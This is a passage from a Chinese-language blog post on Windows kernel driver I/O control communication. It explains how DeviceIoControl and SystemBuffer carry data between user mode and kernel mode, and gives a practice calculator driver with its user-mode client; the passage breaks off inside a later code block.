class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[db]: MajorFumction:<span class="number">14</span></span><br><span class="line">[db]: InputBufferLength:<span class="number">4</span></span><br><span class="line">[db]: OutputBufferLength:<span class="number">8</span></span><br><span class="line">[db]: IoControlCode:<span class="number">1</span></span><br><span class="line">[db]: SystemBuffer: <span class="number">87514</span>ec0 <span class="number">10</span></span><br></pre></td></tr></table></figure><p>如此遍明了DeviceIoControl传参如下</p><pre><code>1. 设备句柄2. IoControlCode3. 传入参数 SystemBuffer4. InputBufferLength5. 返回参数6. OutputBufferLength</code></pre><h3 id="f1Gxc">改变返回参数</h3>我的大致感觉就是，传入参数就像const，是不会改变了并且复制了一份在SystemBuffer中，后续如果对SystemBuffer操作，再回调函数结束后SystemBuffer的值会再次赋值给返回参数，从而做到返回<p>注意点:</p><p>直接更改SystemBuffer是不会改变的需要有以下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;<span class="comment">//成功</span></span><br><span class="line">pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength;<span class="comment">//规定大小</span></span><br></pre></td></tr></table></figure><p>所以将回调函数改成如下样式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MYDEVICE_OPERATION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line">NTSTATUS <span class="title function_">myDispatch</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">ULONG ICC = io-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: In %s\r\n&quot;</span>, __FUNCTION__);</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line"></span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: MajorFunction: %x\r\n&quot;</span>, io-&gt;MajorFunction);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: InputBufferLength: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.InputBufferLength);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: OutputBufferLength: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.OutputBufferLength);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: IoControlCode: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.IoControlCode);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: SystemBuffer: %p %x \r\n&quot;</span>, pIrp-&gt;AssociatedIrp.SystemBuffer,*((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer));</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (ICC) &#123;</span><br><span class="line"><span class="keyword">case</span> IOCTL_MYDEVICE_OPERATION:</span><br><span class="line">*(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = <span class="number">0x520</span>;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: SystemBuffer: %p %x \r\n&quot;</span>, pIrp-&gt;AssociatedIrp.SystemBuffer, *((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//正确返回</span></span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的IOCTL_MYDEVICE_OPERATION作用其实就是出了创建和销毁，剩下的回调函数基本都是这个，那么区分回调函数代码作用的自然就是传入的IoControlCode，控制码，这里和传入控制码进行switch筛选</p><p>通信代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DRIVER_SYM <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MYDEVICE_OPERATION CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开设备失败 error:%d \r\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">ULONG xin = <span class="number">10</span>;</span><br><span class="line">ULONG64 xout = <span class="number">0</span>;</span><br><span class="line">ULONG retlen = <span class="number">0</span>;</span><br><span class="line">BOOL isS = DeviceIoControl(hDevice, IOCTL_MYDEVICE_OPERATION,</span><br><span class="line">&amp;xin, <span class="keyword">sizeof</span>(xin),</span><br><span class="line">&amp;xout, <span class="keyword">sizeof</span>(xout),</span><br><span class="line">&amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;result %d ,%d, %x\r\n&quot;</span>, isS, GetLastError(), xout);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好的我们再捋一遍思路: </p><p>xin-&gt;SystemBuffer-&gt;SystemBuffer&#x3D;0x520-&gt;xout&#x3D;SystemBuffer-&gt;xout&#x3D;0x520</p><p>运行一下试试</p><p>最终获取正确结果</p><p>ps：retLen的存放的是实际返回参数的大小，可以验证一下</p><h2 id="OU9mv">Io通信小记</h2>设备对象下的Flag标志位对应的参数与DeviceIoControl的第二个参数中METHOD_BUFFERED这类的标志是相似的，其规定再传参时，标志采用复制，映射还是直接索引实际地址<p>所以在实践时会十分冗杂麻烦，火哥建议，先用一层结构体做建议Irp，类似通信传参的封装，在这个中引用真正参数的结构体，后续实践来更好理解（确实会如此，在我自己写计算器的时候，num参数因为sizeof的问题只传了一个参数，但是需要很繁杂的去dt dd来检索问题）</p><p>还有就是这样操作会减少蓝屏，毕竟你再怎么操作，都是对R0层结构体中指向的部分，操作。</p><p>有世外桃源的感觉了</p><h2 id="VABTO">最终练习代码</h2><h3 id="tMMW4">计算器</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DRIVER_SYM <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE3 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line">HANDLE hDevice;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(PULONG num,PUCHAR cc)</span> &#123;</span><br><span class="line">ULONG i = <span class="number">0</span>;</span><br><span class="line">CHAR c[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[计算器]: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, c);</span><br><span class="line"><span class="keyword">while</span> (c[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">num[<span class="number">0</span>] = num[<span class="number">0</span>] * <span class="number">10</span> + (c[i++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">*cc = c[i++];</span><br><span class="line"><span class="keyword">while</span> (c[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">num[<span class="number">1</span>] = num[<span class="number">1</span>] * <span class="number">10</span> + (c[i++] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %c %d&quot;</span>, num[<span class="number">0</span>], *cc, num[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">ULONG <span class="title function_">IoC</span><span class="params">(PULONG num, PUCHAR cc)</span> &#123;</span><br><span class="line">ULONG result = <span class="number">0</span>;</span><br><span class="line">ULONG retlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (*cc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">DeviceIoControl(hDevice, CASE1, num, <span class="keyword">sizeof</span>(num) * <span class="number">2</span>, &amp;result, <span class="keyword">sizeof</span>(result), &amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">DeviceIoControl(hDevice, CASE2, num, <span class="keyword">sizeof</span>(num) * <span class="number">2</span>, &amp;result, <span class="keyword">sizeof</span>(result), &amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">DeviceIoControl(hDevice, CASE3, num, <span class="keyword">sizeof</span>(num) * <span class="number">2</span>, &amp;result, <span class="keyword">sizeof</span>(result), &amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">DeviceIoControl(hDevice, CASE4, num, <span class="keyword">sizeof</span>(num) * <span class="number">2</span>, &amp;result, <span class="keyword">sizeof</span>(result), &amp;retlen, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">hDevice = CreateFile(_DRIVER_SYM, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开设备失败 error:%d \r\n&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ULONG is = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (is) &#123;</span><br><span class="line">UCHAR cc;</span><br><span class="line">ULONG num[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">init(num, &amp;cc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; = %d\r\n是否继续，继续请按1，反之按0\r\n&quot;</span>, IoC(num, &amp;cc));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;is);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">L&quot;\\device\\myiotest&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOLICLINK_NAME <span class="string">L&quot;\\??\\myiotest&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OPER2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span></span><br><span class="line">&#123;</span><br><span class="line">UNICODE_STRING SymbolicLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">DbgPrint(<span class="string">&quot;[db]: Close...\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME);</span><br><span class="line">IoDeleteSymbolicLink(&amp;SymbolicLinkName);</span><br><span class="line">IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Dispatch</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: Being work...\r\n&quot;</span>);</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE0 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE3 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CASE4 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line">NTSTATUS <span class="title function_">myDispatch</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">PIO_STACK_LOCATION io = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">ULONG ICC = io-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: In %s\r\n&quot;</span>, __FUNCTION__);</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line"></span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: MajorFunction: %x\r\n&quot;</span>, io-&gt;MajorFunction);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: InputBufferLength: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.InputBufferLength);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: OutputBufferLength: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.OutputBufferLength);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: IoControlCode: %d\r\n&quot;</span>, io-&gt;Parameters.DeviceIoControl.IoControlCode);</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: SystemBuffer: %p %x \r\n&quot;</span>, pIrp-&gt;AssociatedIrp.SystemBuffer,*((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer));</span><br><span class="line"></span><br><span class="line">ULONG* num;</span><br><span class="line">ULONG result;</span><br><span class="line">DbgPrintEx(<span class="number">77</span>, <span class="number">0</span>, <span class="string">&quot;[db]: SystemBuffer: %p %x %x\r\n&quot;</span>, pIrp-&gt;AssociatedIrp.SystemBuffer, *(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer, *((ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer + <span class="number">1</span>));</span><br><span class="line"><span class="comment">//DbgBreakPoint();</span></span><br><span class="line"><span class="keyword">switch</span> (ICC) &#123;</span><br><span class="line"><span class="keyword">case</span> CASE0:</span><br><span class="line">*(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = <span class="number">0x520</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CASE1:</span><br><span class="line">num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">result = num[<span class="number">0</span>] + num[<span class="number">1</span>];</span><br><span class="line">*(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CASE2:</span><br><span class="line">num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">result = num[<span class="number">0</span>] - num[<span class="number">1</span>];</span><br><span class="line">*(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CASE3:</span><br><span class="line">num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">result = num[<span class="number">0</span>] * num[<span class="number">1</span>];</span><br><span class="line">*(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CASE4:</span><br><span class="line">num = (ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">result = num[<span class="number">0</span>] / num[<span class="number">1</span>];</span><br><span class="line">*(ULONG*)pIrp-&gt;AssociatedIrp.SystemBuffer = result;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//正确返回</span></span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = io-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path)</span></span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line">ULONG    uIndex = <span class="number">0</span>;</span><br><span class="line">PDEVICE_OBJECT pDeviceObj = <span class="literal">NULL</span>;</span><br><span class="line">UNICODE_STRING Devicename;</span><br><span class="line">UNICODE_STRING SymbolicLinkName;</span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;Devicename, DEVICE_NAME);</span><br><span class="line"></span><br><span class="line">status = IoCreateDevice(pDriver, <span class="number">0</span>, &amp;Devicename,</span><br><span class="line">FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &amp;pDeviceObj);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;创建设备失败! \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line">pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">RtlInitUnicodeString(&amp;SymbolicLinkName, SYMBOLICLINK_NAME);</span><br><span class="line"></span><br><span class="line">status = IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;Devicename);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;创建符号链接失败! \r\n&quot;</span>);</span><br><span class="line">IoDeleteDevice(pDeviceObj);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_CREATE] = Dispatch;</span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_CLOSE] = Dispatch;</span><br><span class="line">pDriver-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = myDispatch;</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">DbgPrint(<span class="string">&quot;[db]: Finish...\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="a6i9x">结构体传参练习</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 